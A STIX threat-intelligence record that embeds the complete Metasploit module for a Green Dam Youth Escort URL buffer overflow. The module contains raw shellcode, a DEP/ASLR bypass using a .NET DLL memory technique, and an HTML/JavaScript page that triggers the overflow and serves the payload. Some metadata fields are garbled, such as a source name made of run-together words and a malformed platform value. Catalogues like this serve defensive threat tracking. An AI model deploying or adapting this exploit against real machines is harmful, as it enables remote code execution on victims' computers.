{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4335df7a-b4ac-4a06-a0f6-75ec4c6a7ba7",
    "created": "2024-08-14T16:42:47.600846Z",
    "modified": "2024-08-14T16:42:47.60085Z",
    "name": "Green Dam URL Processing Buffer Overflow",
    "description": " This module exploits a stack-based buffer overflow in Green Dam Youth Escort",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/greendam_url.rb",
            "external_id": "greendam_url.rb"
        },
        {
            "source_name": "BysettinganoverlylongURL",
            "external_id": "anattackercanoverrunabufferandexecute"
        },
        {
            "source_name": "reference",
            "url": "http://www.cse.umich.edu/~jhalderm/pub/gd/,\t\t#AnalysisoftheGreenDamCensorwareSystem"
        },
        {
            "source_name": "reference",
            "url": "http://taossa.com/archive/bh08sotirovdowd.pdf,\t#.NETDLLmemorytechnique"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# greendam_url.rb\n#\n# Green Dam URL Processing Buffer Overflow exploit for the Metasploit Framework\n#\n# Green Dam Youth Escort 3.17 successfully exploited on the following platforms:\n#  - Internet Explorer 6, Windows XP SP2\n#  - Internet Explorer 7, Windows XP SP3\n#  - Internet Explorer 7, Windows Vista SP1\n#\n# .NET binary is used to bypass DEP and ASLR\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Green Dam URL Processing Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack-based buffer overflow in Green Dam Youth Escort\n        version 3.17 in the way it handles overly long URLs.\n        By setting an overly long URL, an attacker can overrun a buffer and execute\n        arbitrary code. This module uses the .NET DLL memory technique by Alexander\n        Sotirov and Mark Dowd and should bypass DEP, NX and ASLR.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],\n      'References'     =>\n        [\n          ['OSVDB', '55126'],\n          ['URL', 'http://www.cse.umich.edu/~jhalderm/pub/gd/'],\t\t# Analysis of the Green Dam Censorware System\n          ['EDB', '8938'],\t\t# Original exploit by seer[N.N.U]\n          ['URL', 'http://taossa.com/archive/bh08sotirovdowd.pdf'],\t# .NET DLL memory technique\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500,\n\n          # Temporary stub virtualalloc() + memcpy() payload to RWX page\n          'PrependEncoder' =>\n            \"\\xe8\\x56\\x00\\x00\\x00\\x53\\x55\\x56\\x57\\x8b\\x6c\\x24\\x18\\x8b\\x45\\x3c\"+\n            \"\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\\x32\"+\n            \"\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\\xff\\xfc\\x31\\xc0\\xac\\x38\\xe0\\x74\\x07\"+\n            \"\\xc1\\xcf\\x0d\\x01\\xc7\\xeb\\xf2\\x3b\\x7c\\x24\\x14\\x75\\xe1\\x8b\\x5a\\x24\"+\n            \"\\x01\\xeb\\x66\\x8b\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\\x04\\x8b\\x01\\xe8\"+\n            \"\\xeb\\x02\\x31\\xc0\\x5f\\x5e\\x5d\\x5b\\xc2\\x08\\x00\\x5e\\x6a\\x30\\x59\\x64\"+\n            \"\\x8b\\x19\\x8b\\x5b\\x0c\\x8b\\x5b\\x1c\\x8b\\x1b\\x8b\\x5b\\x08\\x53\\x68\\x54\"+\n            \"\\xca\\xaf\\x91\\xff\\xd6\\x6a\\x40\\x5e\\x56\\xc1\\xe6\\x06\\x56\\xc1\\xe6\\x08\"+\n            \"\\x56\\x6a\\x00\\xff\\xd0\\x89\\xc3\\xeb\\x0d\\x5e\\x89\\xdf\\xb9\\xe8\\x03\\x00\"+\n            \"\\x00\\xfc\\xf3\\xa4\\xff\\xe3\\xe8\\xee\\xff\\xff\\xff\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista SP0-SP1 / IE 6.0 SP0-2 & IE 7.0', { }],\n        ],\n      'DisclosureDate' => '2009-06-11',\n      'DefaultTarget'  => 0))\n  end\n\n  def on_request_uri(cli, request)\n\n    ibase = 0x24240000\n    vaddr = ibase + 0x2065\n\n    if (request.uri.match(/\\.dll$/i))\n\n      print_status(\"Sending .NET DLL\")\n\n      return if ((p = regenerate_payload(cli)) == nil)\n\n      # First entry points to the table of pointers\n      vtable  = [ vaddr + 4 ].pack(\"V\")\n      cbase   = ibase + 0x2065 + (256 * 4)\n\n      # Build a function table\n      255.times { vtable << [cbase].pack(\"V\") }\n\n      # Append the shellcode\n      vtable << p.encoded\n      send_response(\n        cli,\n        Msf::Util::EXE.to_dotnetmem(ibase, vtable),\n        {\n          'Content-Type' => 'application/x-msdownload',\n          'Connection'   => 'close',\n          'Pragma'       => 'no-cache'\n        }\n      )\n      return\n    end\n\n    print_status(\"Sending #{self.name} HTML\")\n\n    j_function\t= rand_text_alpha(rand(100)+1)\n    j_url\t\t= rand_text_alpha(rand(100)+1)\n    j_counter\t= rand_text_alpha(rand(30)+2)\n\n    if (\"/\" == get_resource[-1,1])\n      dll_uri = get_resource[0, get_resource.length - 1]\n    else\n      dll_uri = get_resource\n    end\n    dll_uri << \"/generic-\" + Time.now.to_i.to_s + \".dll\"\n\n    html = %Q|<html>\n<head>\n<script language=\"javascript\">\n  function #{j_function}() {\n    var #{j_url}='';\n    for(var #{j_counter}=1;#{j_counter}<=2035;#{j_counter}++)\n      #{j_url}+='$';\n\n    window.location=#{j_url}+'.html';\n  }\n</script>\n</head>\n<body onload=\"#{j_function}()\">\n  <object classid=\"#{dll_uri}#GenericControl\">\n  <object>\n</body>\n</html>\n    |\n\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_contributors": [
        "[ Trancer <mtrancer[at]gmail.com> ]",
        ""
    ],
    "x_mitre_disclosure_date": "2009-06-11",
    "x_mitre_platforms": [
        "win'"
    ]
}